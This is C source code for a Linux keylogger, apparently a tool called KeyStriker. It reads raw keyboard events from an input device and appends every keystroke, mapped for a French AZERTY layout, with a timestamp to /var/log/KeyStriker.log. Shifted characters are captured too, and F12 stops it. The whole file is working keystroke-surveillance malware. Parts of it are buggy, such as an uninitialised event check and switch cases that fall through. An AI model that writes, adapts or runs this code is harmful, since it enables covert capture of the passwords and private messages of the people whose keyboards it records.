#include <stdio.h>
#include <stdlib.h>
#include <string.h>  // strlen()
#include <unistd.h>  // read()
#include <fcntl.h>  //open()
#include <time.h>  // date
#include <linux/input-event-codes.h> // for ev.code
#include <linux/input.h>  // struct input_event

#include "../includes/keylogger.h"
#include "../includes/utils.h"



void keylogger(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[40] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event ev;

    FILE *log = NULL;

    strftime(buffer, 40, "%A %F %T", tm);

    log = fopen("/var/log/KeyStriker.log", "a+");

    if(log == NULL)
        error("fopen()\nFonction : keylogger()");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device()");

    setbuf(log, NULL);

    if(ev.type == EV_KEY && ev.code == 54 && ev.value == 0)
        printf("Hello");

    while(1)
    {
        if((bytesRead = read (fd, &ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(ev.type == EV_KEY && ev.value == 1 && ev.code == 54)
            Rshift_used_sustained(deviceFile);

        else if(ev.type == EV_KEY && ev.value == 1 && ev.code == 42)
            Lshift_used_sustained(deviceFile);

        else if(ev.type == EV_KEY && ev.value == 1)
        {
            switch(ev.code)
            {
                case 1 : fputs("Echap : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 2 : fputs("& : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 3 : fputs("é : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 4 : fputs("\" : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 5 : fputs("' : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 6 : fputs("( : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 7 : fputs("- : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 8 : fputs("è : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 9 : fputs("_ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 10 : fputs("ç : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 11 : fputs("à : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 12 : fputs(") : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 13 : fputs("= : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 14 : fputs("BackSpace : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 15 : fputs("Tab : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 16 : fputs("a : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 17 : fputs("z : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 18 : fputs("e : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 19 : fputs("r : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 20 : fputs("t : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 21 : fputs("y : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 22 : fputs("u : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 23 : fputs("i : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 24 : fputs("o : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 25 : fputs("p : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 26 : fputs("^ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 27 : fputs("$ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 28 : fputs("Enter : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 29 : fputs("LCtrl : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 30 : fputs("q : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 31 : fputs("s : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 32 : fputs("d : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 33 : fputs("f : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 34 : fputs("g : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 35 : fputs("h : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 36 : fputs("j : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 37 : fputs("k : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 38 : fputs("l : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 39 : fputs("m : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 40 : fputs("ù : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 41 : fputs("² : ", log); fputs(buffer, log); fputs("\n", log); break;

                case 42 : Lshift_used(deviceFile); break;

                case 43 : fputs("* : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 44 : fputs("w : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 45 : fputs("x : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 46 : fputs("c : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 47 : fputs("v : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 48 : fputs("b : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 49 : fputs("n : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 50 : fputs(", : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 51 : fputs("; : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 52 : fputs(": : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 53 : fputs("! : ", log); fputs(buffer, log); fputs("\n", log); break;

                case 54 : Rshift_used(deviceFile); break;

                case 55 : fputs("[Pav num.] * : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 56 : fputs("LAlt : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 57 : fputs("\nSpace : ", log); fputs(buffer, log); fputs("\n\n", log); break;
                case 58 : fputs("Capslock : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 59 : fputs("F1 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 60 : fputs("F2 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 61 : fputs("F3 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 62 : fputs("F4 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 63 : fputs("F5 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 64 : fputs("F6 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 65 : fputs("F7 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 66 : fputs("F8 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 67 : fputs("F9 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 68 : fputs("F10 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 69: fputs("num lock : ", log); fputs(buffer, log); fputs("\n", log); break;
/*A VERIFIER*/  case 70 : fputs("Scroll Lock : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 71 : fputs("[Pav num.] 7 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 72 : fputs("[Pav num.] 8 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 73 : fputs("[Pav num.] 9 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 74 : fputs("[Pav num.] - : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 75 : fputs("[Pav num.] 4 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 76 : fputs("[Pav num.] 5 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 77 : fputs("[Pav num.] 6 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 78 : fputs("[Pav num.] + : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 79 : fputs("[Pav num.] 1 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 80 : fputs("[Pav num.] 2 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 81 : fputs("[Pav num.] 3 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 82 : fputs("[Pav num.] 0 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 83 : fputs("[Pav num.] . : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 84 : fputs("Unknown Key : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 85 : fputs("Unknown Key : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 86 : fputs("< : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 87 : fputs("F11 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 88 : fputs("\nF12 : ", log); fputs(buffer, log); fputs(" Quitting...\n\n", log); exit(EXIT_SUCCESS);  /*F12 for getting out properly of the loop */

                case 96 : fputs("[Pav num.] Enter : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 97 : fputs("RCtrl: ", log); fputs(buffer, log); fputs("\n", log); break;
                case 98 : fputs("[Pav num.] / : ", log); fputs(buffer, log); fputs("\n", log); break;

                case 100 : fputs("AltGr : ", log); fputs(buffer, log); fputs("\n", log); break;

                case 103 : fputs("UPARROW : ", log); fputs(buffer, log); fputs("\n", log); break;
                //case 104 : fputs(": ", log); fputs(buffer, log); fputs("\n", log); break;

                case 105 : fputs("LEFTARROW : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 106 : fputs("RIGHTARROW : ", log); fputs(buffer, log); fputs("\n", log); break;
                //case 107 : fputs(": ", log); fputs(buffer, log); fputs("\n", log); break;
                case 108 : fputs("DOWNARROW : ", log); fputs(buffer, log); fputs("\n", log); break;
                //case 109 : fputs(": ", log); fputs(buffer, log); fputs("\n", log); break;
                //case 110 : fputs(": ", log); fputs(buffer, log); fputs("\n", log); break;

                default : break;
            }
        }
    }

    fclose(log);

}
/*  Log right shift + key and and write the key in the log file.
 *  Then the fonction give back the hand to the main keyllogger fonction called keylloger()
 */

void Rshift_used(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[40] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event Rshift_ev;

    FILE *log = NULL;

    strftime(buffer, 40, "%A %F %T", tm);

    log = fopen("/var/log/KeyStriker.log", "a+");

    if(log == NULL)
        error("fopen()\nFonction : keylogger()");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device()");

    setbuf(log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &Rshift_ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(Rshift_ev.type == EV_KEY && Rshift_ev.value == 1)
        {
            switch(Rshift_ev.code)
            {
                case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 3 : fputs("2 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 4 : fputs("3 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 5 : fputs("4 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 6 : fputs("5 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 7 : fputs("6 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 8 : fputs("7 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 9 : fputs("8 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 10 : fputs("9 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 11 : fputs("0 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 16 : fputs("A : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 17 : fputs("Z : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 18 : fputs("E : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 19 : fputs("R : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 20 : fputs("T : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 21 : fputs("Y : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 22 : fputs("U : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);;
                case 23 : fputs("I : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 24 : fputs("O : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 25 : fputs("P : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 26 : fputs("¨ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 27 : fputs("£ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 30 : fputs("Q : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 31 : fputs("S : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 32 : fputs("D : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 33 : fputs("F : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 34 : fputs("G : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 35 : fputs("H : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 36 : fputs("J : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 37 : fputs("K : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 38 : fputs("L : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 39 : fputs("M : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 40 : fputs("% : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 43 : fputs("µ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 44 : fputs("W : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 45 : fputs("X : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 46 : fputs("C : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 47 : fputs("V : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 48 : fputs("B : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 49 : fputs("N : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 50 : fputs("? : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 51 : fputs(". : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 52 : fputs("/ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 53 : fputs("§ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 86 : fputs("> : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                default : break;
            }
        }
    }

    fclose(log);

}

/*  Log left shift + key and and write the key in the log file.
 *  Then the fonction give back the hand to the main keyllogger fonction called keylloger()
 */

void Lshift_used(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[40] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event Lshift_ev;

    FILE *log = NULL;

    strftime(buffer, 40, "%A %F %T", tm);

    log = fopen("/var/log/KeyStriker.log", "a+");

    if(log == NULL)
        error("fopen()\nFonction : keylogger()");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device()");

    setbuf(log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &Lshift_ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(Lshift_ev.type == EV_KEY && Lshift_ev.value == 1)
        {
            switch(Lshift_ev.code)
            {
                case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 3 : fputs("2 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 4 : fputs("3 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 5 : fputs("4 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 6 : fputs("5 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 7 : fputs("6 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 8 : fputs("7 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 9 : fputs("8 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 10 : fputs("9 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 11 : fputs("0 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 16 : fputs("A : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 17 : fputs("Z : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 18 : fputs("E : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 19 : fputs("R : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 20 : fputs("T : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 21 : fputs("Y : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 22 : fputs("U : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);;
                case 23 : fputs("I : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 24 : fputs("O : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 25 : fputs("P : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 26 : fputs("¨ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 27 : fputs("£ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 30 : fputs("Q : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 31 : fputs("S : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 32 : fputs("D : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 33 : fputs("F : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 34 : fputs("G : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 35 : fputs("H : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 36 : fputs("J : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 37 : fputs("K : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 38 : fputs("L : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 39 : fputs("M : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 40 : fputs("% : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 43 : fputs("µ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 44 : fputs("W : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 45 : fputs("X : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 46 : fputs("C : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 47 : fputs("V : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 48 : fputs("B : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 49 : fputs("N : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 50 : fputs("? : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 51 : fputs(". : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 52 : fputs("/ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 53 : fputs("§ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                case 86 : fputs("> : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
                default : break;
            }
        }
    }

    fclose(log);

}

/*  Same stuff with the only difference that shift is sustained */

void Rshift_used_sustained(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[40] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event sustain_Rshift_ev;

    FILE *log = NULL;

    strftime(buffer, 40, "%A %F %T", tm);

    log = fopen("/var/log/KeyStriker.log", "a+");

    if(log == NULL)
        error("fopen()\nFonction : keylogger()");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device()");

    setbuf(log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &sustain_Rshift_ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(sustain_Rshift_ev.type == EV_KEY && sustain_Rshift_ev.value == 0)
        {
            switch(sustain_Rshift_ev.code)
            {
                case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 3 : fputs("2 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 4 : fputs("3 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 5 : fputs("4 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 6 : fputs("5 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 7 : fputs("6 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 8 : fputs("7 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 9 : fputs("8 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 10 : fputs("9 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 11 : fputs("0 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 16 : fputs("A : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 17 : fputs("Z : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 18 : fputs("E : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 19 : fputs("R : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 20 : fputs("T : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 21 : fputs("Y : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 22 : fputs("U : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 23 : fputs("I : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 24 : fputs("O : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 25 : fputs("P : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 26 : fputs("¨ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 27 : fputs("£ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 30 : fputs("Q : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 31 : fputs("S : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 33 : fputs("F : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 34 : fputs("G : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 35 : fputs("H : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 36 : fputs("J : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 37 : fputs("K : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 38 : fputs("L : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 39 : fputs("M : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 40 : fputs("% : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 43 : fputs("µ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 44 : fputs("W : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 45 : fputs("X : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 46 : fputs("C : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 47 : fputs("V : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 48 : fputs("B : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 49 : fputs("N : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 50 : fputs("? : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 51 : fputs(". : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 52 : fputs("/ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 53 : fputs("§ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 86 : fputs("> : ", log); fputs(buffer, log); fputs("\n", log); break;

                case 88 : fputs("\nF12 : ", log); fputs(buffer, log); fputs(" Quitting...\n\n", log); exit(EXIT_SUCCESS);  /*F12 for getting out properly of the loop */

                default : break;
            }
        }
    }

    keylogger(deviceFile);

}

void Lshift_used_sustained(char *deviceFile)
{
    int bytesRead = 0;
    int fd = 0;

    char buffer[40] = {""};

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    struct input_event sustain_Lshift_ev;

    FILE *log = NULL;

    strftime(buffer, 40, "%A %F %T", tm);

    log = fopen("/var/log/KeyStriker.log", "a+");

    if(log == NULL)
        error("fopen()\nFonction : keylogger()");

    fd = open(deviceFile, O_RDONLY);
    if(fd == -1)
        error("open()\nFonction : open_kb_device()");

    setbuf(log, NULL);

    while(1)
    {
        if((bytesRead = read (fd, &sustain_Lshift_ev, sizeof(struct input_event))) == -1)
            error("read()\nFonction : keylogger()");

        if(sustain_Lshift_ev.type == EV_KEY && sustain_Lshift_ev.value == 0)
        {
            switch(sustain_Lshift_ev.code)
            {
                case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 3 : fputs("2 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 4 : fputs("3 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 5 : fputs("4 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 6 : fputs("5 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 7 : fputs("6 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 8 : fputs("7 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 9 : fputs("8 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 10 : fputs("9 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 11 : fputs("0 : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 16 : fputs("A : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 17 : fputs("Z : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 18 : fputs("E : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 19 : fputs("R : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 20 : fputs("T : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 21 : fputs("Y : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 22 : fputs("U : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 23 : fputs("I : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 24 : fputs("O : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 25 : fputs("P : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 26 : fputs("¨ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 27 : fputs("£ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 30 : fputs("Q : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 31 : fputs("S : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 33 : fputs("F : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 34 : fputs("G : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 35 : fputs("H : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 36 : fputs("J : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 37 : fputs("K : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 38 : fputs("L : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 39 : fputs("M : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 40 : fputs("% : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 43 : fputs("µ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 44 : fputs("W : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 45 : fputs("X : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 46 : fputs("C : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 47 : fputs("V : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 48 : fputs("B : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 49 : fputs("N : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 50 : fputs("? : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 51 : fputs(". : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 52 : fputs("/ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 53 : fputs("§ : ", log); fputs(buffer, log); fputs("\n", log); break;
                case 86 : fputs("> : ", log); fputs(buffer, log); fputs("\n", log); break;

                case 88 : fputs("\nF12 : ", log); fputs(buffer, log); fputs(" Quitting...\n\n", log); exit(EXIT_SUCCESS);  /*F12 for getting out properly of the loop */

                default : break;
            }
        }
    }

    keylogger(deviceFile);

}


